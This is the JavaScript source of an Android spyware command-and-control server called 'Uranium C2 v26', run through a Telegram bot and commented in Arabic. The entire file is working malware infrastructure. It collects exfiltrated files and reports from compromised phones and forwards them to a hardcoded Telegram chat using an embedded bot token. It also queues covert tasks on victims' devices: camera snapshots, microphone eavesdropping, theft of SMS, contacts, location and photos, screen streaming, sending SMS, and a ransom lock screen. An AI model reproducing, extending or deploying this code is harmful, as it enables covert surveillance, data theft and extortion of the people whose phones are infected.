require('dotenv').config();
const express = require('express');
const telegramBot = require('node-telegram-bot-api');
const fs = require('fs');
const path = require('path');
const crypto = require('crypto');
const zlib = require('zlib');
const sqlite3 = require('sqlite3').verbose();

const TOKEN = process.env.TG_TOKEN || "8690276775:AAE_4IsiG6XekmLAMnEwOqBDKM-iJ6D7DUo";
const CHAT_ID = process.env.TG_ID || "7399463177";

if (!TOKEN || !CHAT_ID) {
    console.error('[-] Missing env: TG_TOKEN, TG_ID');
    process.exit(1);
}

const STORAGE_DIR = path.join(__dirname, 'uranium_storage');
fs.mkdirSync(STORAGE_DIR, { recursive: true });

const db = new sqlite3.Database('./uranium_core_v26.db');
db.serialize(() => {
    db.run(`CREATE TABLE IF NOT EXISTS nodes (id TEXT PRIMARY KEY, model TEXT, android_sdk INTEGER, secret TEXT, last_seen INTEGER, online INTEGER DEFAULT 0)`);
    db.run(`CREATE TABLE IF NOT EXISTS tasks (id INTEGER PRIMARY KEY AUTOINCREMENT, node_id TEXT, action TEXT, payload TEXT, status TEXT DEFAULT 'PENDING', created_at INTEGER, sent_at INTEGER)`);
    db.run(`CREATE TABLE IF NOT EXISTS media_chunks (upload_id TEXT, node_id TEXT, file_name TEXT, chunk_index INTEGER, total_chunks INTEGER, is_last INTEGER, file_hash TEXT, received_at INTEGER, PRIMARY KEY (upload_id, chunk_index))`);
});

function deriveKey(secret) {
    return crypto.createHash('sha256').update(secret + '|uranium-v26').digest();
}

function encryptPayload(plainText, key) {
    const compressed = zlib.gzipSync(Buffer.from(plainText, 'utf8'));
    const iv = crypto.randomBytes(12);
    const cipher = crypto.createCipheriv('aes-256-gcm', key, iv);
    const enc = Buffer.concat([cipher.update(compressed), cipher.final()]);
    const tag = cipher.getAuthTag();
    const packet = { v: iv.toString('hex'), g: tag.toString('hex'), d: enc.toString('hex') };
    return Buffer.from(JSON.stringify(packet), 'utf8').toString('base64');
}

function decryptPayload(b64, key) {
    try {
        const pkt = JSON.parse(Buffer.from(b64, 'base64').toString('utf8'));
        const iv = Buffer.from(pkt.v, 'hex');
        const tag = Buffer.from(pkt.g, 'hex');
        const data = Buffer.from(pkt.d, 'hex');
        const decipher = crypto.createDecipheriv('aes-256-gcm', key, iv);
        decipher.setAuthTag(tag);
        const compressed = Buffer.concat([decipher.update(data), decipher.final()]);
        return zlib.gunzipSync(compressed).toString('utf8');
    } catch (e) { return null; }
}

const app = express();
const appBot = new telegramBot(TOKEN, { polling: true });
app.use(express.text({ type: 'text/plain', limit: '100mb' }));
app.use(express.text({ type: 'application/json', limit: '100mb' }));
app.use(express.raw({ type: 'application/octet-stream', limit: '200mb' }));

async function sendTg(msg, options = {}) {
    try { return await appBot.sendMessage(CHAT_ID, msg, { parse_mode: 'HTML', ...options }); }
    catch (e) { console.error('TG:', e.message); }
}

function escapeHtml(s) {
    return String(s).replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
}

app.get('/', (req, res) => {
    res.send(`<html><body style="background:#000;color:#0f0;font-family:monospace;text-align:center;padding-top:80px;"><h1>[☢️] URANIUM C2 v26.0 — SWARM [☢️]</h1></body></html>`);
});

app.post('/api/v3/uranium/stream', (req, res) => {
    const nodeId = req.headers['x-node-id'] || 'unknown';
    const nodeModel = req.headers['x-node-model'] || 'Unknown';
    const sdk = parseInt(req.headers['x-android-sdk'] || '0');
    const secretHeader = req.headers['x-device-secret'] || '';

    db.get(`SELECT secret FROM nodes WHERE id=?`, [nodeId], (err, row) => {
        let secret = row?.secret || secretHeader;
        if (!secret || secret.length < 32) return res.status(400).json({ status: 'NO_SECRET' });

        db.run(`INSERT INTO nodes (id, model, android_sdk, secret, last_seen, online) VALUES (?,?,?,?,?,1)
            ON CONFLICT(id) DO UPDATE SET model=excluded.model, android_sdk=excluded.android_sdk,
            secret=excluded.secret, last_seen=excluded.last_seen, online=1`,
            [nodeId, nodeModel, sdk, secret, Date.now()]);

        const key = deriveKey(secret);
        const decrypted = decryptPayload(req.body, key);
        let payload;
        try { payload = JSON.parse(decrypted || req.body || '{}'); }
        catch { return res.status(400).json({ status: 'BAD_PAYLOAD' }); }

        if (payload.type === 'TEXT_REPORT') {
            const text = (payload.data || '').substring(0, 3800);
            if (text.length > 2) sendTg(`☢️ <b>[${escapeHtml(nodeId)} | ${escapeHtml(nodeModel)}]</b>\n<pre>${escapeHtml(text)}</pre>`);
            return res.json({ status: 'ACK', task: null });
        }

        if (payload.type === 'MEDIA_CHUNK') {
            const { uploadId, fileName, chunkIndex, totalChunks, isLast, fileHash, data } = payload;
            db.run(`INSERT OR REPLACE INTO media_chunks (upload_id,node_id,file_name,chunk_index,total_chunks,is_last,file_hash,received_at) VALUES (?,?,?,?,?,?,?,?)`,
                [uploadId, nodeId, fileName, chunkIndex, totalChunks, isLast ? 1 : 0, fileHash, Date.now()]);
            if (isLast) {
                db.get(`SELECT COUNT(*) as cnt FROM media_chunks WHERE upload_id=?`, [uploadId], (e, r) => {
                    if (r && r.cnt === totalChunks) sendTg(`✅ ملف مكتمل: ${escapeHtml(fileName)} (${totalChunks} جزء) من <code>${nodeId}</code>`);
                });
            }
            return res.json({ status: 'CHUNK_ACK', idx: chunkIndex });
        }

        if (payload.type === 'TASK_RESULT') {
            db.run(`UPDATE tasks SET status='DONE' WHERE id=?`, [payload.taskId]);
            return res.json({ status: 'ACK', task: null });
        }

        db.get(`SELECT * FROM tasks WHERE node_id=? AND status='PENDING' ORDER BY id ASC LIMIT 1`, [nodeId], (err, row) => {
            if (!row) return res.json({ status: 'ACK', task: null });
            db.run(`UPDATE tasks SET status='SENT', sent_at=? WHERE id=?`, [Date.now(), row.id]);
            res.json({ status: 'ACK', task: { id: row.id, action: row.action, payload: JSON.parse(row.payload || '{}') } });
        });
    });
});

app.post('/api/v3/uranium/upload_raw', async (req, res) => {
    try {
        const nodeId = req.headers['x-node-id'] || 'unknown';
        const fileName = path.basename(req.headers['x-file-name'] || `dump_${Date.now()}.bin`);
        if (!Buffer.isBuffer(req.body)) return res.status(400).json({ error: 'BAD_BINARY' });

        const saveDir = path.join(STORAGE_DIR, path.basename(nodeId));
        fs.mkdirSync(saveDir, { recursive: true });
        const finalPath = path.join(saveDir, `${Date.now()}_${fileName}`);
        fs.writeFileSync(finalPath, req.body);

        const mb = (req.body.length / 1024 / 1024).toFixed(2);
        await sendTg(`☢️ <b>${escapeHtml(fileName)}</b> (${mb}MB) من <code>${nodeId}</code>`);
        try { if (req.body.length <= 45 * 1024 * 1024) await appBot.sendDocument(CHAT_ID, finalPath, { caption: `${fileName}` }); } catch (_) {}
        res.json({ status: 'OK' });
    } catch (e) { res.status(500).json({ error: e.message }); }
});

appBot.on('polling_error', () => {});
appBot.on('error', (e) => console.error('BOT:', e.message));

// استخدام Map لتخزين حالة الأوامر النصية بدون ما نقتل الـ polling
const awaitingInput = new Map();

appBot.on('message', async (msg) => {
    if (String(msg.chat.id) !== String(CHAT_ID)) return;
    const text = msg.text || '';

    // إذا كان في أمر ينتظر إدخال نصي
    if (awaitingInput.has(msg.chat.id)) {
        const pending = awaitingInput.get(msg.chat.id);
        awaitingInput.delete(msg.chat.id);
        
        const payload = {};
        if (pending.action.includes("SMS")) { payload.phone = text.split(" ")[0]; payload.msg = text.substring(text.indexOf(" ")+1); }
        else if (pending.action.includes("CALL")) { payload.phone = text; }
        else if (pending.action.includes("URL")) { payload.url = text; }
        else if (pending.action.includes("VOLUME")) { payload.vol = parseInt(text); }
        else if (pending.action.includes("BRIGHTNESS")) { payload.brightness = parseInt(text); }
        else { payload.text = text; }

        db.run(`INSERT INTO tasks (node_id, action, payload, status, created_at) VALUES (?, ?, ?, 'PENDING', ?)`,
            [pending.nodeId, pending.action, JSON.stringify(payload), Date.now()], async () => {
                await sendTg(`✅ تم إرسال الأمر [${pending.action}] بالقيمة: ${text}`);
            });
        return;
    }

    if (text === '/start' || text === '/menu') {
        db.all(`SELECT * FROM nodes ORDER BY last_seen DESC LIMIT 15`, async (err, rows) => {
            if (!rows || !rows.length) return sendTg('⚠️ لا نودات.');
            const kb = rows.map(n => [{ text: `${n.online ? '🟢' : '⚫'} ${n.model}`, callback_data: `menu_${n.id}` }]);
            await sendTg('☢️ <b>v26 Swarm — اختر النود:</b>', { reply_markup: { inline_keyboard: kb } });
        });
    }
});

appBot.on('callback_query', async (query) => {
    if (String(query.from.id) !== String(CHAT_ID)) return;
    const data = query.data;
    const msg = query.message;

    if (data.startsWith('menu_')) {
        const nodeId = data.replace('menu_', '');
        const kb = { inline_keyboard: [
            [{ text: '🔦 فلاش ON', callback_data: `cmd_CMD_FLASH_ON_${nodeId}` }, { text: '🔦 فلاش OFF', callback_data: `cmd_CMD_FLASH_OFF_${nodeId}` }],
            [{ text: '📳 اهتزاز', callback_data: `cmd_CMD_VIBRATE_${nodeId}` }, { text: '🔊 تنبيه', callback_data: `cmd_CMD_BEEP_${nodeId}` }],
            [{ text: '📸 صورة خلفية', callback_data: `cmd_EXTRACT_CAMERA_SNAP_${nodeId}` }, { text: '🤳 صورة أمامية', callback_data: `cmd_EXTRACT_CAMERA_SNAP_FRONT_${nodeId}` }],
            [{ text: '🎙️ تنصت 6s', callback_data: `cmd_MIC_AI_LISTEN_${nodeId}` }, { text: '👁️ لقطة خاطفة', callback_data: `cmd_MICRO_BURST_SNAP_${nodeId}` }],
            [{ text: '📨 SMS', callback_data: `cmd_EXTRACT_SMS_${nodeId}` }, { text: '📞 مكالمات', callback_data: `cmd_EXTRACT_CALLS_${nodeId}` }],
            [{ text: '📇 جهات', callback_data: `cmd_EXTRACT_CONTACTS_${nodeId}` }, { text: '📱 تطبيقات', callback_data: `cmd_EXTRACT_APPS_${nodeId}` }],
            [{ text: '📍 GPS', callback_data: `cmd_EXTRACT_LOCATION_${nodeId}` }, { text: '📋 حافظة', callback_data: `cmd_EXTRACT_CLIPBOARD_${nodeId}` }],
            [{ text: '🖼️ 20 صورة', callback_data: `cmd_EXTRACT_PHOTOS_${nodeId}` }, { text: '📥 10 فيديو', callback_data: `cmd_EXTRACT_VIDEOS_${nodeId}` }],
            
            // --- أوامر v26 ---
            [{ text: '📺 بث الشاشة', callback_data: `cmd_START_SCREEN_STREAM_${nodeId}` }, { text: '🛑 إيقاف البث', callback_data: `cmd_STOP_SCREEN_STREAM_${nodeId}` }],
            [{ text: '🏠 زر الرئيسية', callback_data: `cmd_CMD_HOME_${nodeId}` }, { text: '🔙 زر الرجوع', callback_data: `cmd_CMD_BACK_${nodeId}` }],
            [{ text: '📲 إرسال SMS', callback_data: `text_CMD_SEND_SMS_${nodeId}` }, { text: '📞 اتصال برقم', callback_data: `text_CMD_CALL_NUMBER_${nodeId}` }],
            [{ text: '🌐 فتح رابط', callback_data: `text_CMD_OPEN_URL_${nodeId}` }, { text: '🔊 ضبط الصوت', callback_data: `text_CMD_SET_VOLUME_${nodeId}` }],
            [{ text: '💡 إشعال الشاشة', callback_data: `cmd_CMD_SCREEN_ON_${nodeId}` }, { text: '🔒 قفل الشاشة', callback_data: `cmd_CMD_LOCK_SCREEN_${nodeId}` }],
            [{ text: '🔆 السطوع', callback_data: `text_CMD_BRIGHTNESS_${nodeId}` }, { text: '🔒 شاشة الفدية', callback_data: `cmd_CMD_LOCK_RANSOM_${nodeId}` }],
            [{ text: '💥 Self Destruct', callback_data: `confirm_SELF_${nodeId}` }],
            [{ text: '🔙 رجوع', callback_data: 'back_home' }]
        ] };
        await appBot.editMessageText(`🎯 <b>النود:</b> <code>${nodeId}</code> — v26 Swarm`, {
            chat_id: msg.chat.id, message_id: msg.message_id, parse_mode: 'HTML', reply_markup: kb
        });
    }
    else if (data.startsWith('text_')) {
        const parts = data.split('_');
        const targetNodeId = parts.pop();
        const action = parts.slice(1).join('_');
        
        let promptMsg = "";
        if (action.includes("SMS")) promptMsg = "أرسل الرقم والرسالة مفصولين بمسافة (مثال: 0501234567 مرحبا)";
        else if (action.includes("CALL")) promptMsg = "أرسل الرقم:";
        else if (action.includes("URL")) promptMsg = "أرسل الرابط:";
        else if (action.includes("VOLUME")) promptMsg = "أرسل رقم الصوت (0-100):";
        else if (action.includes("BRIGHTNESS")) promptMsg = "أرسل رقم السطوع (0-255):";
        else promptMsg = "أرسل القيمة:";

        await appBot.sendMessage(msg.chat.id, promptMsg);
        awaitingInput.set(msg.chat.id, { nodeId: targetNodeId, action: action });
    }
    else if (data.startsWith('confirm_SELF_')) {
        const nodeId = data.replace('confirm_SELF_', '');
        await appBot.editMessageText(`⚠️ <b>تأكيد النسف</b> <code>${nodeId}</code>؟`, {
            chat_id: msg.chat.id, message_id: msg.message_id, parse_mode: 'HTML',
            reply_markup: { inline_keyboard: [[{ text: '✅ نعم', callback_data: `cmd_SELF_DESTRUCT_${nodeId}` }, { text: '❌ إلغاء', callback_data: `menu_${nodeId}` }]] }
        });
    }
    else if (data.startsWith('cmd_')) {
        const parts = data.split('_');
        const targetNodeId = parts.pop();
        const action = parts.slice(1).join('_');
        db.run(`INSERT INTO tasks (node_id, action, payload, status, created_at) VALUES (?, ?, '{}', 'PENDING', ?)`,
            [targetNodeId, action, Date.now()], async () => {
                await appBot.answerCallbackQuery(query.id, { text: `☢️ ${action}` });
            });
    }
    else if (data === 'back_home') {
        await appBot.deleteMessage(msg.chat.id, msg.message_id).catch(() => {});
    }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`[+] Uranium C2 v26.0 Swarm on :${PORT}`));
